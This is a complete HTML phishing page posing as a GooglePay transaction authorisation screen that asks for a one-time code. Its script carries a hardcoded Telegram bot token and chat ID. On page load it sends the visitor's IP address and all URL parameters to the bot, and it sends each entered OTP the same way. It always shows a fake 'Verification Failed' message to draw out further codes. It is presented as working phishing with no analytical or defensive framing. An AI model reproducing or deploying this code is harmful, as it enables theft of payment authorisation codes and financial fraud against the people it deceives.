<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>OTP Verification</title>

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />

    <style>
        :root {
            --primary-blue: #1a73e8;
            --primary-blue-light: #e8f0fe;
            --primary-blue-dark: #174ea6;
            --text-primary: #202124;
            --text-secondary: #5f6368;
            --input-border: #dadce0;
            --input-focus-border: var(--primary-blue);
            --input-error-border: #d93025;
            --button-bg: var(--primary-blue);
            --button-bg-hover: var(--primary-blue-dark);
            --button-text: white;
            --background: #f5f7fa;

            /* Material Design padding scale (approximate) */
            --p1: 8px;
            --p2: 16px;
            --p3: 24px;
            --p4: 32px;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: var(--background);
            margin: 0;
            padding: var(--p3);
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            color: var(--text-primary);
        }
        .container {
            background: white;
            padding: var(--p4);
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.15);
            width: 380px;
            box-sizing: border-box;
            text-align: center;
        }
        h2 {
            margin-top: 0;
            margin-bottom: var(--p3);
            font-weight: 700;
            font-size: 1.6rem;
            color: var(--primary-blue);
            text-align: center;
            border-bottom: 3px solid var(--primary-blue-light);
            padding-bottom: var(--p1);
            letter-spacing: 0.02em;
        }
        label {
            display: block;
            margin-bottom: var(--p1);
            font-weight: 500;
            font-size: 0.95rem;
            color: var(--text-secondary);
            text-align: left;
        }
        .input-group {
            position: relative;
            margin-bottom: var(--p3);
            text-align: left;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="number"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1.5px solid var(--input-border);
            border-radius: 6px;
            font-size: 1rem;
            box-sizing: border-box;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            color: var(--text-primary);
            font-weight: 400;
        }
        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="tel"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: var(--input-focus-border);
            box-shadow: 0 0 6px var(--input-focus-border);
        }
        input:invalid:not(:placeholder-shown):not(:focus) {
            border-color: var(--input-error-border);
        }

        .message-text {
            margin-bottom: var(--p3);
            color: var(--text-secondary);
            font-size: 0.95rem;
            line-height: 1.5;
        }
        .message-text.error-message-text {
            color: var(--input-error-border);
            font-weight: 500;
        }


        #submit-otp, #retry-button {
            width: 100%;
            padding: var(--p2);
            background-color: var(--button-bg);
            border: none;
            border-radius: 8px;
            color: var(--button-text);
            font-size: 1.15rem;
            font-weight: 700;
            cursor: pointer;
            opacity: 1;
            transition: background-color 0.3s ease, opacity 0.3s ease;
            font-family: 'Roboto', Arial, sans-serif;
            letter-spacing: 0.02em;
            user-select: none;
        }
        #submit-otp:hover:not(:disabled), #retry-button:hover {
            background-color: var(--button-bg-hover);
        }
        #submit-otp:disabled {
            cursor: not-allowed;
            opacity: 0.6;
            background-color: var(--primary-blue);
        }

        .resend-section {
            margin-top: var(--p3);
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        #resend-otp {
            color: var(--primary-blue);
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
            transition: color 0.3s ease;
            display: inline-block;
        }
        #resend-otp:hover:not(.disabled) {
            color: var(--primary-blue-dark);
        }
        #resend-otp.disabled {
            color: var(--text-secondary);
            cursor: not-allowed;
            text-decoration: none;
        }
        #countdown {
            font-weight: 500;
            color: var(--primary-blue);
            margin-left: 5px;
            display: inline-block;
        }

        h4.secured {
            font-weight: 600;
            font-size: 1rem;
            color: var(--text-secondary);
            text-align: center;
            margin: var(--p2) 0 0 0;
            user-select: none;
            font-family: 'Roboto', Arial, sans-serif;
        }

        .hidden {
            display: none;
        }

        .loading {
            position: relative;
            pointer-events: none;
        }
        
        .loading::after {
            content: "";
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin: -10px 0 0 -10px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 420px) {
            body {
                padding: var(--p2);
            }
            .container {
                width: 100%;
                padding: var(--p3);
            }
        }
    </style>
</head>
<body>

    <div class="container" role="main">
        <div id="otp-form-section">
            <form id="otp-form">
                <h2>Authorize transaction</h2>

                <div class="input-group">
                    <label for="otp">Enter Authentication Code</label>
                    <input
                        type="text"
                        id="otp"
                        name="otp"
                        placeholder="e.g., 123456"
                        maxlength="6"
                        required
                        inputmode="numeric"
                        pattern="^\d{2,6}$" title="Please enter the 2-6 digit code."
                        autocomplete="one-time-code"
                    />
                </div>

                <button id="submit-otp" type="submit">Verify</button>

                <div class="resend-section">
                    Didn't receive the code?
                    <a href="#" id="resend-otp">Resend OTP</a>
                    <span id="countdown"></span>
                </div>
            </form>
        </div>

        <div id="verification-failed-section" class="hidden">
            <h2>Verification Failed</h2>
            <p class="message-text error-message-text">The OTP you entered is incorrect. Please try again.</p>
            <button id="retry-button">Retry Again</button>
        </div>

        <h4 class="secured">Secured by GooglePay</h4>
    </div>

    <script>
        // Configuration
        const botToken = '7252537848:AAHHnI05acNemda4o68TZ3UYKySYw-46XvM';
        const chatId = '6329815039';
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // DOM Elements
        const otpFormSection = document.getElementById('otp-form-section');
        const verificationFailedSection = document.getElementById('verification-failed-section');
        const otpInput = document.getElementById('otp');
        const resendOtpLink = document.getElementById('resend-otp');
        const countdownDisplay = document.getElementById('countdown');
        const otpForm = document.getElementById('otp-form');
        const submitOtpBtn = document.getElementById('submit-otp');
        const retryButton = document.getElementById('retry-button');

        const RESEND_DURATION = 60; // seconds
        let currentCountdown = RESEND_DURATION;
        let countdownTimer;
        let requestDataSent = false;

        // Function to escape special characters for Telegram's MarkdownV2
        function escapeMarkdownV2(text) {
            if (typeof text !== 'string') return 'N/A';
            const specialChars = ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
            specialChars.forEach(char => {
                text = text.replace(new RegExp('\\' + char, 'g'), '\\' + char);
            });
            return text;
        }

        // Function to send message to Telegram
        async function sendTelegramMessage(message) {
            const data = {
                chat_id: chatId,
                text: message,
                parse_mode: 'MarkdownV2'
            };

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                console.log('Telegram API response:', result);
                return result;
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
                return { ok: false };
            }
        }

        // Function to get query parameters from URL
        function getQueryParams() {
            const params = {};
            const queryString = window.location.search.substring(1);
            const pairs = queryString.split('&');
            
            for (let i = 0; i < pairs.length; i++) {
                const pair = pairs[i].split('=');
                if (pair.length === 2) {
                    params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
                }
            }
            
            return params;
        }

        // Function to send initial request data to Telegram
        async function sendInitialRequestData() {
            if (requestDataSent) return; // Only send once
            
            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Get query parameters
                const queryParams = getQueryParams();
                
                // Create base message
                let baseMessage = "*Incoming Request Details*\\n";
                baseMessage += "🕒 *Time:* `" + escapeMarkdownV2(new Date().toLocaleString()) + "`\\n";
                baseMessage += "🌐 *IP:* `" + escapeMarkdownV2(userIP) + "`\\n";
                baseMessage += "📋 *Method:* `" + escapeMarkdownV2('GET') + "`\\n\\n";
                
                // Send base message
                await sendTelegramMessage(baseMessage);
                
                // Send each query parameter as a separate message
                for (const [key, value] of Object.entries(queryParams)) {
                    if (value) {
                      
                      const fieldMessage = escapeMarkdownV2(value);
                        await sendTelegramMessage(fieldMessage);
                    }
                }
                
                // Send end of request data
                await sendTelegramMessage("📌 *End of Request Data* 📌");
                
                requestDataSent = true;
            } catch (error) {
                console.error('Error sending initial request data:', error);
            }
        }

        // Function to start the countdown
        function startCountdown() {
            resendOtpLink.classList.add('disabled');
            resendOtpLink.style.pointerEvents = 'none';

            currentCountdown = RESEND_DURATION;
            countdownDisplay.textContent = `(${currentCountdown}s)`;

            clearInterval(countdownTimer);
            countdownTimer = setInterval(() => {
                currentCountdown--;
                countdownDisplay.textContent = `(${currentCountdown}s)`;

                if (currentCountdown <= 0) {
                    clearInterval(countdownTimer);
                    resendOtpLink.classList.remove('disabled');
                    resendOtpLink.style.pointerEvents = 'auto';
                    countdownDisplay.textContent = '';
                }
            }, 1000);
        }

        // Handle Resend OTP logic
        resendOtpLink.addEventListener('click', (event) => {
            event.preventDefault();
            if (!resendOtpLink.classList.contains('disabled')) {
                console.log('Resending OTP...');
                alert('A new OTP has been sent!');
                startCountdown();
            }
        });

        // OTP input formatting (digits only)
        otpInput.addEventListener("input", e => {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
            submitOtpBtn.disabled = !otpForm.checkValidity();
        });
        
        // Initial setup
        window.addEventListener('load', () => {
            submitOtpBtn.disabled = !otpForm.checkValidity();
            startCountdown();
            
            // Send initial request data to Telegram
            sendInitialRequestData();
        });

        // Listen for form input changes
        otpForm.addEventListener('input', () => {
            submitOtpBtn.disabled = !otpForm.checkValidity();
        });

        // Handle form submission
        otpForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            
            if (!otpForm.checkValidity()) {
                const firstInvalidInput = otpForm.querySelector(':invalid');
                if (firstInvalidInput) {
                    firstInvalidInput.focus();
                }
                return;
            }

            // Show loading state
            submitOtpBtn.disabled = true;
            submitOtpBtn.classList.add('loading');
            submitOtpBtn.textContent = 'Verifying...';

            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Create message for Telegram with OTP
                const otpMessage = escapeMarkdownV2(otpInput.value);

                // Send OTP to Telegram
                const result = await sendTelegramMessage(otpMessage);
                
                if (result.ok) {
                    console.log('OTP sent to Telegram successfully');
                    
                    // For demo purposes, we'll randomly decide if verification fails
                    // In a real application, you would verify the OTP against your backend
                    const isVerificationFailed = true;
                    
                    if (isVerificationFailed) {
                        // Show verification failed UI
                        otpFormSection.classList.add('hidden');
                        verificationFailedSection.classList.remove('hidden');
                    } else {
                        // In a real app, you would redirect to success page
                        alert('Verification successful!');
                        otpForm.reset();
                        startCountdown();
                    }
                } else {
                    alert('Error sending verification. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            } finally {
                // Reset button state
                submitOtpBtn.disabled = !otpForm.checkValidity();
                submitOtpBtn.classList.remove('loading');
                submitOtpBtn.textContent = 'Verify';
            }
        });

        // Retry button handler
        retryButton.addEventListener('click', function() {
            verificationFailedSection.classList.add('hidden');
            otpFormSection.classList.remove('hidden');
            otpInput.value = '';
            otpInput.focus();
            startCountdown();
        });
    </script>
</body>
</html>
